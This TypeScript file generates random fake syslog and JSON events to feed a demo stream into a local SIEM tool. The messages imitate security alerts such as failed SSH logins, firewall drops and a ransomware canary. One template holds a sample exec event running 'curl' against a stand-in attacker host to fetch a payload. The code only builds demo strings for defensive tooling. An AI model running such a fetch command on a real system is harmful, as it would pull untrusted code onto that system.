const HOSTS = ["mbp-research.local", "mini-build.lan", "gateway.home", "studio-m4.local"];
const USERS = ["david", "ops", "builder", "guest"];

const TEMPLATES: Array<() => string> = [
  () =>
    `<86>1 ${iso()} ${host()} sshd ${pid()} - - Failed password for ${user()} from 185.243.${n(20)}.${n(250)} port ${22000 + n(4000)} ssh2`,
  () =>
    `<85>1 ${iso()} ${host()} sshd ${pid()} - - Invalid user admin from 45.155.${n(200)}.${n(250)} port ${n(50000)}`,
  () =>
    `<4>1 ${iso()} ${host()} kernel ${pid()} - - pf: dropped in on en0 proto tcp from 91.219.${n(80)}.${n(200)} to 10.0.0.${n(40)} port 445`,
  () =>
    `<14>1 ${iso()} ${host()} sandboxd ${pid()} - - deny(1) file-read-data /Users/${user()}/Library/Application Support/LocalSIEM/siem_enterprise.db`,
  () =>
    `<6>1 ${iso()} ${host()} sudo ${pid()} - - ${user()} : TTY=ttys001 ; PWD=/Users/${user()} ; USER=root ; COMMAND=/usr/bin/dscl . -read /Users/root`,
  () =>
    `<3>1 ${iso()} ${host()} endpointsecurity ${pid()} - - ES_EVENT_TYPE_NOTIFY_EXEC suspicious binary /private/tmp/.hidden/launcher argv=curl https://evil.example/payload`,
  () =>
    `<2>1 ${iso()} ${host()} osquery ${pid()} - - ransomware canary tripped: ~/Documents/~$invoice.docx.locked hash=e3b0c44298fc`,
  () =>
    `<11>1 ${iso()} ${host()} securityd ${pid()} - - code signature invalid for /Applications/UtilityHelper.app (CDHash mismatch)`,
  () =>
    `<5>1 ${iso()} ${host()} log ${pid()} - - unified_log: com.apple.networkd TLS trust failure talking to update-cdn.local`,
  () =>
    `<14>1 ${iso()} ${host()} launchd ${pid()} - - service disabled: com.acme.telemetry reason=unauthorized persistence`,
  () =>
    `<10>1 ${iso()} ${host()} syslogd ${pid()} - - possible CVE-2024-21762 exploitation attempt in httpd access log`,
  () =>
    `<13>1 ${iso()} ${host()} firewall ${pid()} - - socketfilterfw allow sshd lport=22 uid=0`,
  () =>
    JSON.stringify({
      timestamp: iso(),
      hostname: host(),
      appName: "local-siem-sensor",
      severity: 4,
      facility: 1,
      message: `file quarantine event path=/Users/${user()}/Downloads/installer.dmg xattr=com.apple.quarantine`,
      pid: pid()
    }),
  () =>
    JSON.stringify({
      hostname: host(),
      app: "auditd",
      severity: 3,
      message: `privilege escalation watch: ${user()} spawned /bin/zsh with euid=0 via AuthorizationExecuteWithPrivileges`
    })
];

function iso(): string {
  return new Date().toISOString();
}
function host(): string {
  return HOSTS[Math.floor(Math.random() * HOSTS.length)];
}
function user(): string {
  return USERS[Math.floor(Math.random() * USERS.length)];
}
function pid(): number {
  return 200 + Math.floor(Math.random() * 8000);
}
function n(max: number): number {
  return Math.floor(Math.random() * max) + 1;
}

export function randomSyslog(): string {
  const make = TEMPLATES[Math.floor(Math.random() * TEMPLATES.length)];
  return make();
}

export function startDemoStream(
  ingest: (message: string) => Promise<unknown>
): () => void {
  let timer: NodeJS.Timeout | null = null;
  let stopped = false;
  const burst = async (count: number) => {
    for (let i = 0; i < count; i += 1) {
      try {
        await ingest(randomSyslog());
      } catch (err) {
        console.warn("[demo] ingest failed", err);
      }
    }
  };
  void burst(6);
  const loop = () => {
    if (stopped) return;
    const delay = 1200 + Math.floor(Math.random() * 2600);
    timer = setTimeout(() => {
      void burst(1 + (Math.random() < 0.2 ? 2 : 0));
      loop();
    }, delay);
  };
  loop();
  return () => {
    stopped = true;
    if (timer) clearTimeout(timer);
  };
}
